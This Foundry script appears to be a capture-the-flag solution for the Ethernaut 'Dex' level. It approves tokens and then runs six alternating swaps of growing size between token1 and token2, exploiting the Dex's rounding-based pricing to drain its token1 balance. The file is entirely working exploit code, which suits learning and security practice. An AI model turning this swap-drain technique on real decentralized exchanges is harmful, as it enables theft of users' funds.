// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel22.sol";
import "forge-std/Script.sol";

contract POC is Script {
    Dex level22 = Dex(0xAd4E05cb9B386Dc6B7692899e2f8046997957d2A);

    function run() external {
        vm.startBroadcast();

        //approve address and amount
        level22.approve(address(level22), 500);

        //get tokens
        address token1 = level22.token1();
        address token2 = level22.token2();

        //execute swaps
        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        console.log(
            "Final token1 balance of Dex is : ",
            level22.balanceOf(token1, address(level22))
        );

        vm.stopBroadcast();
    }
}
